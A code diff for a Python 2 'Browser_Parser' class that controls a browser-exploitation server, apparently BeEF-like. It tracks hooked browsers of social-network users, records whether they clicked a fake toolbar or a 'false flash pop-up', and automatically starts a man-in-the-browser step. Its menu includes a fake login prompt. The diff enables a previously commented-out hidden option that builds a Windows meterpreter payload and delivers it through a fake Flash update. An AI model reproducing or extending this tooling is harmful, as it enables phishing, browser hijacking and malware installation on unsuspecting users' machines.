@@ -44,7 +44,7 @@ class Browser_Parser:
 		if socnet_choice.lower() == 'facebook':
 			socnet_choice, self.account = 'Facebook','facebook'
 		elif socnet_choice.lower() == 'linkedin':
-			socnet_choice, self.account = 'LinkedIn', 'linkedIn'
+			socnet_choice, self.account = 'LinkedIn', 'linkedin'
 		elif socnet_choice.lower() == 'youtube':
 			socnet_choice, self.account = 'YouTube', "youtube"
 		elif socnet_choice.lower() == 'generic':
@@ -190,25 +190,36 @@ class Browser_Parser:
 
 	def get_toolbar_result(self):
 		#if toolbar prompt id is none, return
-		idee = self.browser_db_router.get_browser_toolbar_cmd(self.user_id)
-		print str(idee)
-		self.browser_id = self.browser_db_router.get_browser_session_id(self.user_id)
-		print str(self.browser_id)
-		print(str("toolbar_prompt_id:" + str(self.toolbar_prompt_id)))
-		dets = requests.get(url='https://192.168.3.1:3000/api/modules/'
-			+ str(self.browser_id)
-			+ '/' + str(self.toolbar_prompt_id) + '/' + str(idee)
-			+"?token="
-			+str(self.api_key), cert=self.cert, verify=False)
-		c_dict= json.loads(dets.text)
-		try:
-			if c_dict['1']:
-				print "user has clicked on the toolbar"
-				return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 1)
-		except KeyError as ke:
-			print "user has not clicked on toolbar"
-			return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 0)
-
+		if self.toolbar_prompt_id is not None:
+			idee = self.browser_db_router.get_browser_toolbar_cmd(self.user_id)
+			print str(idee)
+			self.browser_id = self.browser_db_router.get_browser_session_id(self.user_id)
+			print str(self.browser_id)
+			print(str("toolbar_prompt_id:" + str(self.toolbar_prompt_id)))
+			dets = requests.get(url='https://192.168.3.1:3000/api/modules/'
+				+ str(self.browser_id)
+				+ '/' + str(self.toolbar_prompt_id) + '/' + str(idee)
+				+"?token="
+				+str(self.api_key), cert=self.cert, verify=False)
+			c_dict= json.loads(dets.text)
+			print c_dict
+			try:
+				if c_dict['1']:
+					print "user has clicked on the toolbar"
+					self.toolbar_prompt_id = None
+					return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 1)
+			except KeyError as ke:
+				try:
+					if c_dict['0']:
+						print "user has clicked on false flash pop-up"
+						self.toolbar_prompt_id = None
+						return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 1)
+				except KeyError as ke:
+					print "user has not clicked on toolbar"
+					return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 0)
+		else:
+			print "plz issue toolbar cmd first"
+			pass
 
 	def get_hooked_browsers(self):
 		hooked_browsers = {}
@@ -228,6 +239,7 @@ class Browser_Parser:
 			print "browser session id: " + str(browser_id)
 			self.browser_id = browser_id
 			self.browser_db_router.update_BrowserTable_Session_id(self.user_id, self.browser_id, self.redirect_uri)
+			self.man_in_the_browser()
 			return self.get_browser_deets(self.browser_id)
 		else:
 			print "no hooked browser found"
@@ -274,7 +286,6 @@ class Browser_Parser:
 				self.menu()
 			elif resp == 1:
 				self.get_hooked_browsers()
-				self.man_in_the_browser()
 				self.menu()
 			elif resp == 2:
 				self.promt_fake_login()
@@ -296,15 +307,12 @@ class Browser_Parser:
 				self.menu()
 			elif resp == 8:
 				sys.exit()
-			'''
-			THIS WILL NOT BE DONE DURING THE TRIALS, THIS IS FOR THE EVENTUAL PRESENTATION WHEN I WILL EXPLOIT MY OWN MACHINE FOR SHOW
 			elif resp == 666:
 				rusure = raw_input("[!] ARE YOU SURE YOU WANT TO DO THIS?")
 				if rusure.lower() == "yes":
 					self.make_meterpreter_payload("windows")
 					self.fake_flash_update(self.exploit)
-				self.menu()'''
+				self.menu()
 
 if __name__ == "__main__":
 	bp = Browser_Parser()
-
